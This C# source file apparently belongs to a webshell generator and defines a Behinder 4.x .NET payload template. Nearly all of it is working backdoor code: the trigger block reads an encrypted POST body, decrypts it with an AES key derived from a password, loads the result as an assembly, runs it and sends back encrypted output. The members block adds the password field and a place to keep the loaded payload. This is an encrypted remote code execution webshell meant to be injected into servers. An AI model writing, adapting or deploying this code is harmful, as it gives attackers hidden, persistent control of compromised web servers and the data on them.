namespace NMG.Shells;

/// <summary>
/// Behinder 4.x .NET protocol payload template.
/// Simpler than Godzilla: reads raw POST body, AES-decrypts with MD5(pass)[0:16] bytes,
/// loads the assembly and executes. Response is AES-encrypted bytes written directly.
/// </summary>
public static class BehinderNet
{
    /// <summary>
    /// Behinder trigger logic: read raw body, decrypt, Assembly.Load, execute.
    /// Injected into the registrar template's trigger method.
    /// </summary>
    public const string TriggerBlock = """
        System.Web.HttpContext Ctx = System.Web.HttpContext.Current;
        System.Web.HttpResponse Resp = Ctx.Response;
        try
        {
            if (Ctx.Request.InputStream.Length > 0)
            {
                byte[] encData = new byte[Ctx.Request.InputStream.Length];
                Ctx.Request.InputStream.Read(encData, 0, (int)Ctx.Request.InputStream.Length);
                Ctx.Request.InputStream.Position = 0;

                byte[] aesKey = new System.Security.Cryptography.MD5CryptoServiceProvider()
                    .ComputeHash(System.Text.Encoding.Default.GetBytes({{PASSWORD}}));
                byte[] key16 = new byte[16];
                Array.Copy(aesKey, key16, 16);

                byte[] decData = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(
                    key16, key16).TransformFinalBlock(encData, 0, encData.Length);

                if (payload == null)
                {
                    payload = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load",
                        new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { decData });
                }
                else
                {
                    System.IO.MemoryStream outStream = new System.IO.MemoryStream();
                    object o = payload.CreateInstance("BH");
                    o.Equals(outStream);
                    o.Equals(encData);
                    o.ToString();
                    byte[] result = outStream.ToArray();
                    if (result.Length > 0)
                    {
                        outStream.Dispose();
                        byte[] encResult = new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(
                            key16, key16).TransformFinalBlock(result, 0, result.Length);
                        Resp.ContentType = "application/octet-stream";
                        Resp.BinaryWrite(encResult);
                        Resp.End();
                    }
                }
            }
        }
        catch (Exception)
        {
        }
        """;

    public const string MembersBlock = """
        public string password = {{PASSWORD}};
        private System.Reflection.Assembly payload;
        public static bool load = false;
        """;

    /// <summary>
    /// Behinder does not use random padding - response is pure encrypted bytes.
    /// </summary>
    public const string RandomStringBlock = """
        public static string GenerateRandomString(int length)
        {
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            byte[] b = new byte[4];
            new System.Security.Cryptography.RNGCryptoServiceProvider().GetBytes(b);
            System.Random rd = new System.Random(System.BitConverter.ToInt32(b, 0));
            for (int i = 0; i < length; i++)
            {
                sb.Append(((char)rd.Next(33, 127)).ToString());
            }
            return sb.ToString();
        }
        """;
}
